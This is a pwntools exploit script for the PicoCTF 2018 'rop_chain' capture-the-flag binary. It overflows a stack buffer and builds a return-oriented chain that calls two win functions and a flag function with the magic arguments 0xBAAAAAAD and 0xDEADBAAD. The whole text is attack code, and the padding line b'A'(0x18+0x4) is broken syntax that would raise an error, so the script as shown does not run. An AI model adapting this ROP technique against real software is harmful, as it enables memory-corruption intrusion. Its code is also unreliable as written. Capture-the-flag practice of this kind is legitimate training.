from pwn import *

context(log_level='debug')

io=process("./PicoCTF_2018_rop_chain")
#io=remote("node3.buuoj.cn",29898)
elf=ELF("./PicoCTF_2018_rop_chain")

io.recv()

f1=elf.symbols['win_function1']
f2=elf.symbols['win_function2']
flag=elf.symbols['flag']

#由于function2 与 flag 函数 a1的值是传入的参数

#有 f2=0xBAAAAAAD  flag=0xDEADBAAD

payload=b'A'(0x18+0x4)+p32(f1)+p32(f2)+p32(flag)+p32(0xBAAAAAAD)+p32(0xDEADBAAD)


io.sendline(payload)
#pop_rdi_ret=0x400733


io.interactive()